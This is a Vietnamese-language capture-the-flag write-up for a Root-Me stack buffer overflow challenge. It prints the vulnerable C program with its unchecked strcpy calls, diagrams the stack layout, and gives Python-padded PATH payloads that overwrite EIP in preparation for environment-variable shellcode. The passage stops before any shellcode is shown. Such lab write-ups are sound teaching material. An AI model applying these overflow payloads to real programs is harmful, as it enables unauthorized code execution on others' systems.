
# Co-che-hoat-dong-cua-ma-doc - challenge 5 CTF Write up
```html
ELF x86 - Stack buffer overflow basic 4: ssh -p 2222 app-systeme-ch8@challenge02.root-me.org 
```

![image](https://user-images.githubusercontent.com/64201705/120130184-bac8d300-c1ef-11eb-9a06-2c075e009029.png)

## Write up

```Text
Sau khi SSH vào server thì ta dùng lệnh cat để in code trong file source code ra
app-systeme-ch8@challenge02:~$ cat ch8.c
```
Ta sẽ được như này:
```C
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

struct EnvInfo
{
  char home[128];
  char username[128];
  char shell[128];
  char path[128];
};


struct EnvInfo GetEnv(void)
{
  struct EnvInfo env;
  char *ptr;

  if((ptr = getenv("HOME")) == NULL)
    {
      printf("[-] Can't find HOME.\n");
      exit(0);
    }
  strcpy(env.home, ptr);
  if((ptr = getenv("USERNAME")) == NULL)
    {
      printf("[-] Can't find USERNAME.\n");
      exit(0);
    }
  strcpy(env.username, ptr);
  if((ptr = getenv("SHELL")) == NULL)
    {
      printf("[-] Can't find SHELL.\n");
      exit(0);
    }
  strcpy(env.shell, ptr);
  if((ptr = getenv("PATH")) == NULL)
    {
      printf("[-] Can't find PATH.\n");
      exit(0);
    }
  strcpy(env.path, ptr);
  return env;
}

int main(void)
{
  struct EnvInfo env;

  printf("[+] Getting env...\n");
  env = GetEnv();

  printf("HOME     = %s\n", env.home);
  printf("USERNAME = %s\n", env.username);
  printf("SHELL    = %s\n", env.shell);
  printf("PATH     = %s\n", env.path);

  return 0;
}
```
Đối với challenge này, ta thấy chương trình sẽ load biến môi trường lên và sử dụng hàm `strcpy` để thực hiện copy env đó qua con trỏ ptr. Vì thế, ta sẽ nghĩ tới việc chương trình sẽ load đoạn shell code do ta chuẩn bị nằm trong biến môi trường và copy qua con trỏ. Sau đó sẽ ghi đè câu lệnh return 0 để gọi tới hàm có địa chỉ nằm trong shell code.
Đầu tiên ta thấy chương trình cần biến môi trường `USERNAME` cho nên ta sẽ export biến này trước: `export USERNAME=AAAA`
Sau khi gọi hàm Getenv() và gần tới câu lệnh return, stack sẽ có dạng:
540 - 128 = 412, 412 - 128 = 284 và 284 - 128 = 156
```
            +----------------------------+
            |      HOME env variable     |     %ebp - 540
            +----------------------------+
            |    USERNAME env variable   |     %ebp - 412
            +----------------------------+
            |      SHELL env variable    |     %ebp - 284
            +----------------------------+
            |      PATH env variable     |     %ebp - 156
            +----------------------------+
            |           saved ebp        |
            +----------------------------+
            |        return address      |     %ebp + 4
            +----------------------------+
            |   rep movsl dest. address  |     %ebp + 8
            +----------------------------+  
```
Ta sẽ set biến môi trường USERNAME bằng một đoạn văn bản nào đó:

![image](https://user-images.githubusercontent.com/64201705/120205711-79b6da00-c254-11eb-9af5-346156c0dabb.png)

Ta sẽ thử ghi đè EIP để xem có chuyển hướng chương trình được không, ở đây offset của EIP sẽ là 164 - 16 

```bash
PATH=$(/usr/bin/python -c 'print "/usr/local/bin:" + "A" * (164-16)') peda -ex "run" ./ch8

```
![image](https://user-images.githubusercontent.com/64201705/120206275-327d1900-c255-11eb-8600-7ae63b32b00d.png)

Ta thấy EIP bị ghi đè bởi kí tự "AAA"
Tiếp theo ta sẽ thử ghi đè lên %ebp + 8 | rep movsl destination address để gọi shellcode của ta được lưu trong biến môi trường SHELLCODE sẽ tạo sau này:
- Trước hết, ta xem địa chỉ dòng lệnh ret nằm ở vị trí nào, ta sẽ đặt breakpoint ngay trước lệnh ret:

![image](https://user-images.githubusercontent.com/64201705/120206972-0746f980-c256-11eb-8790-e8dba35e7bfa.png)

- Bây giờ ta sẽ tiến hành ghi đè nó bằng payload:
`PATH=$(/usr/bin/python -c 'print "/usr/local/bin:" + "A" * (161-16) + "AAAA"') peda -ex "b*0x08048672" -ex "run" -ex "i f" -ex "x/3wx \$ebp" ./ch8`
